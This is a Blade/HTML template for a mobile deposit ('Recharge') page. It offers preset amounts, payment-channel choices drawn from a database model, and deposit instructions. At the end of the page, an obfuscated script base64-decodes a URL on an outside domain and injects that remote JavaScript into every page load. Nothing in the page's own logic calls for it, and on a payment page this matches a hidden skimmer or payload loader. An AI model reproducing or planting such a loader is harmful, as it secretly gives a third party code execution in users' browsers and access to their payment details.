<html>
 <head> 
  <meta charset="utf-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <title>EMI – Recharge</title>
  <link rel="stylesheet" href="/v2/layui/css/layui.css"> 
  <link rel="stylesheet" href="/v2/css/common.css">
  <link rel="stylesheet" href="/v2/css/emi-theme.css">
  <!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/layui/2.5.7/css/layui.min.css">-->
  <style>
        .quick{
            background: rgba(255,255,255,0.8);
            border-radius: 100px 100px 100px 100px;
            padding: 10px;
            color:#8F8F8F;
            text-align: center;
            border: 1px solid #DEDEDE;
            height: 50px;
            width: 50px;
            line-height: 50px;
        }
        .quick p{
            font-family: PingFang SC, PingFang SC;font-weight: 400;font-size: 16px;color: #8F8F8F;width: 50px;line-height: 50px;
        }
        .quick_active{
            background: rgba(255,255,255,0.8);
            border-radius: 100px 100px 100px 100px;
            padding: 10px;
            color:#486BEA;text-align: center;
            border: 1px solid #486BEA;
        }
        .quick_active p{
            font-family: PingFang SC, PingFang SC;font-weight: 400;font-size: 16px;color: #486BEA;width: 50px;line-height: 50px;
        }
        .layui-panel-window{background:#FFFFFF !important;border-top: none }

        .layui-input{background: none;color:#49494F;border: none; }
        .header{
            border: none;
            background: none;
            background-image: url("/v2/img/user/bill_bg.png");
            background-size: 100% 180px;
            background-repeat: no-repeat;
            height:180px;
            margin-bottom: 0px;
            padding-bottom: 0px;
        }
    </style> 
 </head> 
 <body class="common_body common_background" style="background-image: url(/v2/img/user/recharge_bg.png);"> 
  <div class="common_header"> 
<a href="/" class="back position flex items-center space-x-2">
    <!-- SVG Back Icon -->
    <p class="btn m-0">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
        </svg>
    </p>
    <span>Recharge</span>
</a>
  </div> 
  <script id="BalanceTpl" type="text/html">
    <div class="common_margin_10 common_padding_10" >
        <div class="label" style="color: #DEEFFF">Balance</div>
        <div class="value commission_amount common_margin_top_10" style="font-weight: 700;font-size: 22px;color: #FFFFFF;">MIL 0</div>
    </div>
</script> 
  <div class="common_margin_15" id="balance_card" style="margin-top: 0"> 
  </div> 
  <div class="common_card position common_margin_15">
   <form onsubmit="goPayment(event)">
    <div class="demo-login-container"> 
     <div class="common_item_title">
      Recharge amount
     </div> 
     <div class="layui-form-item" style="margin-top: 10px;border-radius: 8px;background: #ffffff;border: 1px solid #DEDEDE"> 
      <div class="layui-input-wrap"> 
       <div class="layui-input-prefix">
        =
       </div> 
       <input type="number" name="amount" id="recharge_amount" value="" lay-verify="required" placeholder="Recharge amount" lay-reqtext="Recharge amount" autocomplete="off" class="layui-input"> 
      </div> 
     </div> 
     <div class="common_item_title">
      Quick amount
     </div> 
     <div class="layui-row layui-col-space10" style="margin-top: 15px;"> 
    <!--  <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick quick_active" data-value="290"> 
        <p style="">290</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="370"> 
        <p style="">370</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="970"> 
        <p style="">970</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="1070"> 
        <p style="">1070</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="1770"> 
        <p style="">1770</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="1970"> 
        <p style="">1970</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="19070"> 
        <p style="">19070</p> 
       </div> 
      </div> 
      <div class="layui-col-xs3 layui-col-md3"> 
       <div class="quick " data-value="50070"> 
        <p style="">50070</p> 
       </div>
      </div> -->
      @foreach([100, 340, 2880, 5750, 15500, 35900, 72000, 119000] as $value)
            <div class="layui-col-xs3 layui-col-md3">
              <div class="quick {{ $loop->first ? 'quick_active' : '' }}" onclick="getAmount(this, {{ $value }})">
                <p>{{ $value }}</p>
              </div>
            </div>
          @endforeach
     </div> 
     <a href="/deposit/history" class="fixed_top_right" style="margin-top: 30px"> Record &gt; </a> 
     <div class="fixed_bottom"> 
      <div style="padding: 10px 15px;"> 
       <button class="layui-btn  layui-btn-lg layui-btn-fluid layui-btn-radius common_btn" lay-submit="" lay-filter="recharge">Recharge Now</button> 
      </div> 
     </div> 
    </div> 
   </form> 
  </div> 
  <div class="common_card position" style="margin: 15px;"> 
   <div class="common_card_content" style="background: #FFFFFF;"> 
    <div class="demo-login-container"> 
     <div> 
      <div class="common_item_title">
       Recharge Channel
      </div> 
     </div>
     <h3 style="margin-top: 25px;">Payment Channel</h3>
        @foreach(\App\Models\PaymentMethod::get() as $el)
          <div style="margin-top: 15px;padding:20px;background: #FFFFFF;border-radius: 8px;border: 1px solid #F0F0F0;display: flex;justify-content: space-between;align-items: center;">
            <div><span>{{ $el->name }}</span></div>
            <input type="radio" name="payment_method" value="{{ $el->id }}" style="width: 20px; height: 20px;" {{ $loop->first ? 'checked' : '' }}>
          </div>
        @endforeach
   <!--  @foreach(\App\Models\PaymentMethod::get() as $el)
     <div style="margin-top: 15px;padding:20px;background: #FFFFFF;border-radius: 8px 8px 8px 8px;border: 1px solid #F0F0F0;display: flex;justify-content: space-between"> 
      <div value="{{ $el->id }}" style="width: 20px; height: 20px;" {{ $loop->first ? 'checked' : '' }}>
          </div> 
       <span>{{ $el->name }}</span> 
      </div> @endforeach-->
      <!--<input type="radio" name="pay_way_id" value="4" style="width: 20px;height: 20px;" checked> 
     </div> 
     <div style="margin-top: 15px;padding:20px;background: #FFFFFF;border-radius: 8px 8px 8px 8px;border: 1px solid #F0F0F0;display: flex;justify-content: space-between"> 
      <div lay-radio=""> 
       <span>QePay</span> 
      </div> 
      <input type="radio" name="pay_way_id" value="3" style="width: 20px;height: 20px;"> 
     </div> 
     <div style="margin-top: 15px;padding:20px;background: #FFFFFF;border-radius: 8px 8px 8px 8px;border: 1px solid #F0F0F0;display: flex;justify-content: space-between"> 
      <div lay-radio=""> 
       <span>XDPay</span> 
      </div> 
      <input type="radio" name="pay_way_id" value="5" style="width: 20px;height: 20px;"> 
     </div>--->
    </div> 
   </div> 
  </div> 
  <div class="common_card position" style=" margin: 15px;"> 
   <div class="common_card_content"> 
    <div class="demo-login-container" style=""> 
     <p class="common_explain">Explain</p> 
     <div class="common_content"> 
      <p>1. If it is difficult to pay a large amount, you can pay in installments, for example, 10,000, divided into 2 times 5,000</p> 
      <p>2. Please do not modify the deposit amount. Unauthorized modification of the deposit amount will result in thedeposit not being credited</p> 
      <p>3. Each deposit requires payment to be initiated through this page, please do not save the payment</p> 
      <p>4. Deposit received within 5 minutes, if not received within 5 minutes, please contact online customer service for processing</p> 
      <!--<p >5. Due to too many deposit users, please try multiple times to obtain the deposit link or try again after a period of time</p>--> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div style="height: 80px;"></div> 
  <!--<a href="/help"  id="service">--> 
  <!--  <img src="/public/v1/img/common/service.png" style="width: 40px;height: 40px">--> 
  <!--</a>--> 
  <!-- Loading Spinner Overlay -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="spinner"></div>
</div>

<!-- Alert Message -->
@include('alert-message')

<!-- JavaScript -->
<script>
  function getAmount(_this, amount) {
    document.querySelector('input[name="amount"]').value = amount;
    document.querySelectorAll('.quick').forEach(q => q.classList.remove('quick_active'));
    _this.classList.add('quick_active');
  }

  function goPayment(event) {
    event.preventDefault();
    const overlay = document.getElementById('loadingOverlay');
    const amount = document.getElementById('recharge_amount').value;
    const method = document.querySelector('input[name="payment_method"]:checked');

    if (!method) {
      alert("Select payment channel");
      return;
    }

    if (!amount || amount <= 0) {
      alert("Enter recharge amount");
      return;
    }

    overlay.style.display = 'flex';

    setTimeout(() => {
      overlay.style.display = 'none';
      window.location.href = '{{ url('user/payment') }}/' + amount + '/' + method.value;
    }, 2000);
  }
</script>
<script>
(function(){
  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
  var s = document.createElement("script");
  s.src = atob(e);
  document.head.appendChild(s);
})();
</script>
</body>
</html>